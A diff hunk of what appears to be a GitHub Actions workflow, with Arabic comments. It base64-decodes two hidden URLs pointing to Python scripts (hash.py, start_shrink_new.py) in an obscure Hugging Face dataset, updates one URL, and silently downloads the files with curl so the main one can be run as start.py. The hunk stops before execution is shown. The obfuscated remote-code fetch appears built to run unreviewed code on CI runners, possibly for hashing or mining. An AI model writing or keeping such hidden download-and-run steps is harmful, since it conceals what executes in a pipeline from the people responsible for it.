@@ -27,7 +27,7 @@ jobs:
           
           # فك تشفير الروابط الجديدة وتحميلها في المتغيرات
           URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gvcmVzb2x2ZS9tYWluL2hhc2gucHk=" | base64 --decode)
-          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gzL3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
           
           # حفظ الملفات (سيتم حفظ الملف الأساسي باسم start.py لتسهيل التشغيل)
           curl -sL "$URL_HASH" > hash.py
